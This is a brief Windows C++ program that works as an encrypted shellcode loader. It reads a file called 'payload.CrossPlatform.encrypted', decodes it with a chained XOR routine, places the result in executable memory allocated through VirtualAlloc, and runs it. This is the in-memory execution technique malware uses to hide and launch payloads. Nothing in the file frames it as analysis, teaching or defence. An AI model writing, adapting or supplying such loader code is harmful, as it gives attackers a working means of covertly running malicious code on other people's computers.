#include <windows.h>
#include <fstream>
#include <vector>

static std::vector<unsigned char> decryptCross(const std::vector<unsigned char>& enc) {
    if (enc.empty()) return {};
    unsigned char iv = enc[0];
    std::vector<unsigned char> out(enc.begin() + 1, enc.end());
    unsigned char prev = iv;
    for (size_t i = 0; i < out.size(); ++i) {
        out[i] ^= 0x42 ^ ((i + 1) % 256);
        out[i] ^= prev;
        prev = out[i];
    }
    return out;
}

int main() {
    std::ifstream f("payload.CrossPlatform.encrypted", std::ios::binary);
    std::vector<unsigned char> enc((std::istreambuf_iterator<char>(f)),
                                   std::istreambuf_iterator<char>());
    auto dec = decryptCross(enc);
    if (!dec.empty()) {
        auto exec = VirtualAlloc(nullptr, dec.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (exec) { memcpy(exec, dec.data(), dec.size()); ((void(*)())exec)(); }
    }
    return 0;
}
